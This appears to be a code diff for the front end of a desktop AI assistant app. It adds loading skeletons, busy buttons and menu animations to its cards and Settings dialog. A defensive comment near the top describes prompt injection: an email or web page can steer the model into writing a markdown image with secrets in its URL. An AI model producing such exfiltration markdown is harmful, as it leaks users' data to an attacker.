@@ -31,8 +31,13 @@ import "./game.css";
 import "./theme-blocky.css";
 import "./motion.css";
 import "./hearing.css";
+import "./menu-motion.css";
+import { installDialogMotion, openFrom, slideIn } from "./menu-motion";
+import { busyButton, loadInto, startLoading, type LoadOpts } from "./loader";
 
-const $ = <T extends HTMLElement>(sel: string) => document.querySelector<T>(sel)!;
+installDialogMotion();          // every dialog opens from its button, closes back into it, and Escape animates too
+
+const $ =<T extends HTMLElement>(sel: string) => document.querySelector<T>(sel)!;
 // Markdown from the model is untrusted: an email or web page can steer it into writing ![](https://x/?d=<secrets>),
 // which would leak data the moment the image loads. So no remote media, styles or frames are rendered from markdown;
 // an image becomes a link the user can choose to open (pictures Monkey searched for use their own card).
@@ -179,7 +184,7 @@ function attachSounds(s: Record<string, any>) {
       openNow.set(d, d.open);
       a3.sfx.play(d.open ? "ui_open" : "ui_close", 0.9);
     }
-  }).observe(document.body, { attributes: true, attributeFilter: ["open"], subtree: true });
+  }).observe(document.body, { attributes: true, attributeFilter: ["open", "data-m-closing"], subtree: true });   // closing starts the sound (menu-motion)
   // Stop loops and ringing sounds when the window is hidden (no phantom sounds from the tray).
   document.addEventListener("visibilitychange", () => { if (document.hidden) a3.sfx.stopAll(); });
 }
@@ -390,6 +395,16 @@ function card(title: string, ...body: Child[]) {
   return c;
 }
 
+/** Fill a card that was put up early with a loading skeleton (same card: no second entrance, the skeleton
+ *  crossfades out over the content). */
+function fillCard(c: HTMLElement, title: string, ...body: Child[]): HTMLElement {
+  c.dataset.title = title;
+  c.querySelector(".cardtitle")!.textContent = title;
+  c.classList.remove("m-loading");
+  for (const b of body) if (b) c.append(b);
+  return c;
+}
+
 /** aria-expanded on card titles follows the folded state (screen readers hear "collapsed"). */
 function syncFolded() {
   cards.querySelectorAll<HTMLElement>(".card > h3 > .cardtitle").forEach((t) =>
@@ -519,29 +534,40 @@ function weatherCard(p: any) {
       h("div", { class: "meta" }, x.wind))))));
 }
 
-function assignmentsCard(board: any) {
-  document.querySelectorAll(".card.assign").forEach((c) => c.remove());
-  const c = card("✅ Assignments");
-  c.querySelector("h3")!.append(h("button", {
+/** The homework card. `into`: a card already on screen showing the loading skeleton (menuCard) to fill instead. */
+function assignmentsCard(board: any, into?: HTMLElement | null) {
+  if (!into) document.querySelectorAll(".card.assign:not(.m-loading)").forEach((c) => c.remove());
+  const c = into ?? card("✅ Assignments");
+  const refresh = h("button", {
     class: "ghost mini", type: "button", title: "Refresh from Canvas",
-    onclick: async () => { const r = await api.get_assignments(true); if (r.ok) assignmentsCard(r); else toast(`⚠ ${r.error}`); },
-  }, "↻"));
+    onclick: async () => {
+      let r: any;
+      try { r = await busyButton(refresh, () => api.get_assignments(true), "Checking Canvas…"); } catch (e) { r = { ok: false, error: String(e) }; }
+      if (r.ok) assignmentsCard(r); else toast(`⚠ ${r.error}`);
+    },
+  }, "↻") as HTMLButtonElement;
+  c.querySelector("h3")!.append(refresh);
   renderAssignments(c, board, async (id, done) => {
     const r = await api.toggle_assignment(id, done);
     if (r.ok && done) avatar.emote("celebrate");
     return r;
   }, (u) => api.open_url(u));
+  return c;
 }
 
 /** The to-do list panel. `data` comes from a "todos" event (Monkey showed it) or is loaded here (the button). */
 async function todoCard(data?: any, tab?: "open" | "overdue" | "done") {
+  let into: HTMLElement | null = null;
+  const btn = $("#todoBtn");
+  const fromButton = !data;
   if (!data?.items) {                 // the button, or Monkey's "todos" event (which only says which tab to show)
-    const r = await api.todo_list();
-    if (!r.ok) return toast(`⚠ ${r.error ?? "Couldn't load your to-do list"}`);
-    data = { ...r, filter: data?.filter };
+    const got = await menuCard("📝 To-do", "assign", { what: "your to-do list", skel: "list", rows: 5, art: "bananas" }, () => api.todo_list());
+    data = { ...got.value, filter: data?.filter };
+    into = got.host;
   }
-  document.querySelectorAll(".card.todo").forEach((c) => c.remove());
-  const c = card("📝 To-do");
+  document.querySelectorAll(".card.todo").forEach((c) => { if (c !== into) c.remove(); });
+  const c = into ?? card("📝 To-do");
+  if (fromButton && !into) openFrom(c, btn);
   renderTodos(c, api, { items: data.items ?? [], settings: data.settings }, {
     celebrate: () => avatar.emote("celebrate"),
     ask: (text) => { addMsg("sys", "🐒 Asked Monkey for help with a to-do"); void api.send_text(text, importance); },
@@ -554,11 +580,13 @@ async function todoCard(data?: any, tab?: "open" | "overdue" | "done") {
   return c;
 }
 
-function healthCard(hd: any) {
-  document.querySelectorAll(".card.health").forEach((c) => c.remove());
+function healthCard(hd: any, into?: HTMLElement | null) {
+  document.querySelectorAll(".card.health").forEach((c) => { if (c !== into) c.remove(); });
   const label = hd.date === new Date().toISOString().slice(0, 10) ? "today" : hd.date;
-  const c = card(`❤️ Health · ${label}`);
+  const c = into ?? card(`❤️ Health · ${label}`);
+  if (into) { c.dataset.title = `❤️ Health · ${label}`; c.querySelector(".cardtitle")!.textContent = c.dataset.title; }
   renderHealth(c, hd);
+  return c;
 }
 
 // ------------------------------------------------------------------ events from Python
@@ -775,7 +803,8 @@ $("#settingsBtn").addEventListener("click", () => openSettings());
 $("#labBtn").addEventListener("click", () => {
   document.querySelectorAll(".card.lab").forEach((c) => c.remove());
   const c = card("🧪 Avatar Lab");
-  renderAvatarLab(c, api);
+  openFrom(c, $("#labBtn"));
+  void renderAvatarLab(c, api);
 });
 
 function cleanupCard(plan: { items?: { kind: string; label: string; path: string; status?: string; detail?: string }[] }) {
@@ -837,17 +866,36 @@ function updateToast(u: { available: string }) {
     h("button", { type: "button", class: "ghost mini", onclick: (e: Event) => motion.leave((e.target as HTMLElement).closest<HTMLElement>(".update-toast")) }, "Later")));
 }
 
+/**
+ * A header menu (Homework, To-do, Health, Lab). Fast data: the card pops out of its button as before. Slow data
+ * (over 150 ms): the card pops out at once with a skeleton in its real layout and the content crossfades in when it
+ * arrives; a failure stays in the card with Try again. Resolves with the data and the card it may render into.
+ */
+function menuCard<T>(title: string, cls: string, o: LoadOpts<T>, load: () => Promise<T>) {
+  const opener = document.activeElement instanceof HTMLButtonElement ? document.activeElement : null;
+  return loadInto(() => {
+    const c = card(title);
+    c.classList.add(...cls.split(" "), "m-loading");
+    openFrom(c, opener);
+    return c;
+  }, load, o).then((r) => { r.host?.classList.remove("m-loading"); return r; });
+}
+
 $("#asgBtn").addEventListener("click", async () => {
-  const r = await api.get_assignments(false);
-  if (!r.ok) return toast(`⚠ ${r.error}`);
-  if (r.source === "none") return toast("Connect Canvas in Settings (token or calendar feed)");
-  assignmentsCard(r);
+  const btn = $("#asgBtn");
+  const { value: r, host } = await menuCard("✅ Assignments", "assign", { what: "your homework", skel: "list", art: "bananas" },
+    () => api.get_assignments(false));
+  if (r.source === "none") { if (host) motion.removeSmoothly(host); return toast("Connect Canvas in Settings (token or calendar feed)"); }
+  const c = assignmentsCard(r, host);
+  if (!host) openFrom(c, btn);
 });
 $("#todoBtn").addEventListener("click", () => void todoCard());
 $("#healthBtn").addEventListener("click", async () => {
-  const r = await api.get_health("today");
-  if (!r.ok) return toast(`⚠ ${r.error}`);
-  healthCard(r.health);
+  const btn = $("#healthBtn");
+  const { value: r, host } = await menuCard("❤️ Health · today", "health", { what: "your sleep and heart rate", skel: "health", art: "vine" },
+    () => api.get_health("today"));
+  const c = healthCard(r.health, host);
+  if (!host) openFrom(c, btn);
 });
 document.addEventListener("keydown", (e) => { if (e.key === "Escape") api.stop_speaking(); });
 
@@ -867,13 +915,20 @@ let settingsOpenDetails = new Set<string>();
 
 let outlookMsg = "";   // last Connect result, kept across Settings re-renders
 async function openSettings(section?: string) {
-  appState = await api.get_state();
+  const dlg = $<HTMLDialogElement>("#settings");
+  const wasOpen = dlg.open;
+  // Opening: if the app is slow to answer, the dialog pops open at once with a skeleton (re-renders stay quiet).
+  appState = wasOpen ? await api.get_state() : (await loadInto(() => settingsShell(dlg), () => api.get_state(),
+    { what: "your settings", skel: "settings", art: "monkey", failed: () => null })).value;
+  const shown = dlg.dataset.shell === "1";
+  delete dlg.dataset.shell;
+  if (shown && !dlg.open) { applyChrome(appState); return; }   // closed while it was loading: stays closed
   applyChrome(appState);
   const s = appState.settings;
-  const dlg = $<HTMLDialogElement>("#settings");
   // Re-rendering must not throw you back to the top (testers lost the Sign in button that way).
-  const prevScroll = dlg.open ? dlg.querySelector<HTMLElement>(".body")?.scrollTop ?? 0 : 0;
-  if (dlg.open) settingsOpenDetails = new Set([...dlg.querySelectorAll<HTMLDetailsElement>("details[id][open]")].map((d) => d.id));
+  const rerender = wasOpen && dlg.open;
+  const prevScroll = rerender ? dlg.querySelector<HTMLElement>(".body")?.scrollTop ?? 0 : 0;
+  if (rerender) settingsOpenDetails = new Set([...dlg.querySelectorAll<HTMLDetailsElement>("details[id][open]")].map((d) => d.id));
   const status = (on: boolean) => h("span", { class: `dot ${on ? "on" : ""}` });
   const keyRow = ([name, label, help]: [string, string, string]) => {
     const hint = appState.key_hints?.[name];
@@ -1240,19 +1295,21 @@ async function openSettings(section?: string) {
         })()),
         (() => {
           const out = h("span", { class: "meta", id: "updStatus" }, "");
-          api.update_state().then((u) => { out.textContent = updateText(u); });
+          void loadInto(() => out, () => api.update_state(), { what: "the update status", compact: true, failed: () => null })
+            .then(({ value: u }) => { out.textContent = updateText(u); });
           const auto = h("input", { type: "checkbox", checked: s.auto_update !== false });
           auto.addEventListener("change", async () => { appState = await api.save_settings({ auto_update: auto.checked }); toast("Saved"); });
           return h("div", {},
             h("div", { class: "field" }, h("span", {}, "Updates"), out,
-              h("button", { class: "ghost", type: "button", onclick: async () => {
+              h("button", { class: "ghost", type: "button", onclick: async (e: Event) => {
                 out.textContent = updateText({ status: "checking" });
-                const u = await api.check_update();      // returns at once; live progress comes as events
+                // returns at once; live progress comes as events (a slow answer shows the banana loader)
+                const u = await busyButton(e.currentTarget as HTMLButtonElement, () => api.check_update(), "Checking…");
                 out.textContent = updateText(u);
                 if (u.status === "ready") updateToast(u);
               } }, "Check now"),
-              h("button", { class: "ghost", type: "button", onclick: async () => {
-                const r = await api.cleanup_plan();
+              h("button", { class: "ghost", type: "button", onclick: async (e: Event) => {
+                const r = await busyButton(e.currentTarget as HTMLButtonElement, () => api.cleanup_plan(), "Looking for old installs…");
                 if (!r.ok) return toast(`⚠ ${r.error}`);
                 $<HTMLDialogElement>("#settings").close();
                 cleanupCard(r);
@@ -1284,6 +1341,16 @@ async function openSettings(section?: string) {
   const body = dlg.querySelector<HTMLElement>(".body")!;
   if (section) { jumpTo(dlg, section); setTimeout(() => jumpTo(dlg, section, false), 120); }   // again after layout settles
   else body.scrollTop = prevScroll;
+}
+
+/** The Settings frame shown while the app is still answering (only when that takes over 150 ms). */
+function settingsShell(dlg: HTMLDialogElement): HTMLElement {
+  dlg.replaceChildren(h("div", { class: "settings" },
+    h("header", {}, h("strong", {}, "Settings"), h("div", { class: "spacer" }), h("button", { class: "icon", onclick: () => dlg.close() }, "✕")),
+    h("div", { class: "body", style: "min-height: calc(88vh - 72px)" })));   // the real Settings' height: no jump
+  dlg.dataset.shell = "1";
+  if (!dlg.open) dlg.showModal();
+  return dlg.querySelector<HTMLElement>(".body")!;
 }
 
 /** Settings layout: the everyday things first, developer things folded away under Advanced, and a menu to jump around. */
@@ -1350,10 +1417,16 @@ function jumpTo(dlg: HTMLDialogElement, id: string, flash = true) {
   const body = dlg.querySelector<HTMLElement>(".body")!;
   const target = id === "start" || id === "check" ? null : dlg.querySelector<HTMLElement>(`#set-${id}`);
   if (target instanceof HTMLDetailsElement) target.open = true;
-  // Plain scrollTop math (no smooth scrolling) so nothing else can interrupt it.
-  body.scrollTop = target ? target.getBoundingClientRect().top - body.getBoundingClientRect().top + body.scrollTop - 8 : 0;
+  // Plain scrollTop math (no smooth scrolling) so nothing else can interrupt it. Layout offsets, not screen rects:
+  // the dialog may still be scaling in, which would skew a rect-based answer.
+  let y = 0;
+  for (let el: HTMLElement | null = target; el && el !== body; el = el.offsetParent as HTMLElement | null) y += el.offsetTop;
+  const before = body.scrollTop;
+  body.scrollTop = target ? y - 8 : 0;
   if (!flash) return;
   const box = target ?? dlg.querySelector<HTMLElement>(id === "check" ? "#set-check" : "#set-start");
+  // switching sections: the section slides in from the direction you travelled
+  if (box && Math.abs(body.scrollTop - before) > 4) slideIn(box, body.scrollTop > before ? "down" : "up");
   box?.classList.add("attention");
   setTimeout(() => box?.classList.remove("attention"), 1600);
 }
@@ -1407,13 +1480,19 @@ function googleEvent(p: any) {
 
 // ------------------------------------------------------------------ check everything
 let lastHealthReport = "";
+let checkLoading: ReturnType<typeof startLoading> | null = null;
 function healthSection() {
   const out = h("div", { id: "checkAllOut", class: "checkall" });
   const btn = h("button", { class: "primary", type: "button", id: "checkAllBtn", onclick: async () => {
-    const r = await api.health_check();
+    const r = await busyButton(btn, () => api.health_check(), "Starting…");
     if (!r.ok) { toast(`⚠ ${r.error}`); return; }
-    out.replaceChildren(h("p", { class: "help" }, "Checking every part of Monkey… (about 10–20 seconds)"));
-  } }, "Check everything");
+    // the report arrives as a "health" event (healthEvent) 10–20 s later: a swinging-vine loader with a skeleton
+    // of the report until then
+    out.replaceChildren();
+    checkLoading = startLoading(out, { what: "", art: "vine", skel: "rows", rows: 6, msgs: [
+      "Checking every part of Monkey… (about 10–20 seconds)", "Still checking: the microphone, voices and your keys…",
+      "Still checking: Google, calendars and Canvas…", "Nearly done: the slow checks (network) come last."] });
+  } }, "Check everything") as HTMLButtonElement;
   return h("section", {}, h("h4", {}, "Is everything working?"),
     h("p", { class: "help" }, "Tests the microphone, wake word, voices, your keys, Google, calendars, Canvas, memory and the morning brief on this PC. Free; nothing is sent or changed. Copy the report to share it: it never includes keys, emails or links."),
     h("div", { class: "field" }, btn), out);
@@ -1427,6 +1506,12 @@ const FIX_SECTION: Record<string, string> = { Brain: "start", Voice: "sound", Li
 function healthEvent(p: any) {
   const out = document.getElementById("checkAllOut");
   if (!out) return;
+  if (checkLoading) {                 // the report replaces the loader (crossfade, after its minimum time)
+    const ld = checkLoading;
+    checkLoading = null;
+    ld.done(() => healthEvent(p));
+    return;
+  }
   if (!p.ok) { out.replaceChildren(h("p", { class: "help" }, `⚠ ${p.error}`)); return; }
   lastHealthReport = p.report;
   const icon: Record<string, string> = { ok: "✓", warn: "⚠", fail: "✗", skip: "–" };
@@ -1467,17 +1552,22 @@ function benchEvent(p: any) {
 let briefDismissed = false;
 async function showMorningBrief(refresh = false) {
   if (refresh && (briefDismissed || !cards.querySelector('.card[data-title^="☀️"]'))) return;   // closed stays closed
-  const r = await api.brief_preview(!refresh, refresh).catch(() => null);
-  if (!r?.ok || !r.brief) return;
+  // At start-up a slow brief shows its card at once with a skeleton (a refresh keeps the old card until the new one).
+  let host: HTMLElement | null = null;
+  const r = refresh ? await api.brief_preview(false, true).catch(() => null)
+    : await loadInto(() => { const c = card("☀️ Morning brief"); c.classList.add("m-loading"); return c; },
+        () => api.brief_preview(true, false).catch(() => null),
+        { what: "your morning brief", skel: "block", rows: 5, art: "monkey", failed: () => null }).then((x) => { host = x.host; return x.value; });
+  if (!r?.ok || !r.brief) { if (host) motion.removeSmoothly(host); return; }
   const folded = !!cards.querySelector('.card.folded[data-title^="☀️"]');
-  cards.querySelectorAll<HTMLElement>(".card").forEach((c) => { if ((c.dataset.title ?? "").startsWith("☀️")) c.remove(); });
-  briefCard(r.brief, folded);
+  cards.querySelectorAll<HTMLElement>(".card").forEach((c) => { if ((c.dataset.title ?? "").startsWith("☀️") && c !== host) c.remove(); });
+  briefCard(r.brief, folded, host);
 }
 
-function briefCard(b: Brief, wasFolded = false) {
+function briefCard(b: Brief, wasFolded = false, into: HTMLElement | null = null) {
   const title = b.kind === "draft" ? "☀️ Morning brief (preview)" : b.kind === "late" ? "☀️ Today (made after your first class started)" : "☀️ Morning brief";
-  const others = [...cards.querySelectorAll<HTMLElement>(".card")].filter((c) => !c.classList.contains("folded"));
-  const c = card(title,
+  const others = [...cards.querySelectorAll<HTMLElement>(".card")].filter((c) => !c.classList.contains("folded") && c !== into);
+  const body: Child[] = [
     b.kind === "draft" ? h("p", { class: "help" }, "Tell Monkey when your first class is each day and he'll have this ready 90 minutes before. ",
       h("button", { class: "ghost mini", type: "button", onclick: () => void openSettings("brief") }, "Set my class times")) : "",
     h("p", {}, h("strong", {}, "Top priority: "), b.top),
@@ -1485,7 +1575,8 @@ function briefCard(b: Brief, wasFolded = false) {
     ...b.sections.map((s) => h("div", { class: `briefsec ${s.status}` },
       h("strong", {}, s.title),
       s.items.length ? h("ul", { class: "items" }, ...s.items.map((i) => h("li", {}, i))) : "",
-      s.note ? h("span", { class: "meta" }, s.note) : "")));
+      s.note ? h("span", { class: "meta" }, s.note) : ""))];
+  const c = into ? fillCard(into, title, ...body) : card(title, ...body);
   c.querySelector(".close")?.addEventListener("click", () => { briefDismissed = true; });
   if (wasFolded) {                                  // a refresh must not pop the brief open over the chat
     c.classList.add("folded");
@@ -1495,7 +1586,8 @@ function briefCard(b: Brief, wasFolded = false) {
 
 const DAY_LABEL: Record<string, string> = { mon: "Mon", tue: "Tue", wed: "Wed", thu: "Thu", fri: "Fri" };
 function briefSettings(s: Record<string, any>) {
-  const status = h("p", { class: "help" }, "…");
+  const status = h("p", { class: "help" }, "");
+  let firstStatus = true;
   const grid = h("div", { class: "briefgrid" });
   const inputs: Record<string, HTMLInputElement> = {};
   for (const d of Object.keys(DAY_LABEL)) {
@@ -1520,7 +1612,9 @@ function briefSettings(s: Record<string, any>) {
   };
   const taskState = h("span", { class: "meta" }, "");
   const refresh = async () => {
-    const st = await api.brief_status();
+    const st = firstStatus ? (await loadInto(() => status, () => api.brief_status(), { what: "your brief schedule", compact: true, failed: () => null })).value
+      : await api.brief_status();
+    firstStatus = false;
     status.textContent = (st.verified
       ? `✓ Set. Your next brief: ${friendly(st.next_run)} (${st.lead_min} min before your first class).`
       : "Not set yet: type the start time of your first class on each school day, then click Confirm schedule.")
@@ -1540,8 +1634,8 @@ function briefSettings(s: Record<string, any>) {
     void refresh();
   } }, "Turn on");
   void refresh();
-  const detect = h("button", { class: "ghost", type: "button", onclick: async () => {
-    const r = await api.brief_candidates();
+  const detect = h("button", { class: "ghost", type: "button", onclick: async (e: Event) => {
+    const r = await busyButton(e.currentTarget as HTMLButtonElement, () => api.brief_candidates(), "Reading your calendar…");
     if (!r.ok) { gridHint.className = "help keynote bad"; gridHint.textContent = `⚠ ${r.error} You can also just type the times above.`; return; }
     const c = r.candidates ?? {};
     for (const [d, v] of Object.entries(c)) if (inputs[d]) inputs[d].value = v.time;
@@ -1655,8 +1749,11 @@ function memoryInspector() {
         } }, "Forget")));
     return r;
   };
+  let loaded = false;
   const load = async () => {
-    const r = await api.memory_list();
+    const r = loaded ? await api.memory_list()
+      : (await loadInto(() => out, () => api.memory_list(), { what: "what Monkey knows", skel: "rows", rows: 5, art: "monkey", failed: () => null })).value;
+    loaded = true;
     if (!r.ok) { out.replaceChildren(h("p", { class: "help" }, `⚠ ${r.error}`)); return; }
     const needle = q.value.trim().toLowerCase();
     const facts = (r.facts ?? []).filter((f) => !needle || f.text.toLowerCase().includes(needle));
@@ -1714,8 +1811,8 @@ function contextImport() {
 }
 
 function historyControls(s: Record<string, any>) {
-  const stats = h("span", { class: "meta" }, "…");
-  api.history_stats().then((st) => {
+  const stats = h("span", { class: "meta" }, "");
+  void loadInto(() => stats, () => api.history_stats(), { what: "your history", compact: true, failed: () => null }).then(({ value: st }) => {
     stats.textContent = st.enabled ? `${st.sessions ?? 0} conversation${st.sessions === 1 ? "" : "s"} saved${appState.settings.show_tech_details ? ` · ${st.episodes ?? 0} summaries · ${st.facts ?? 0} lines searchable${st.fts ? "" : " (basic search)"}` : ""}` : "History is off";
   });
   const enabled = h("input", { type: "checkbox", checked: s.history_enabled !== false }) as HTMLInputElement;
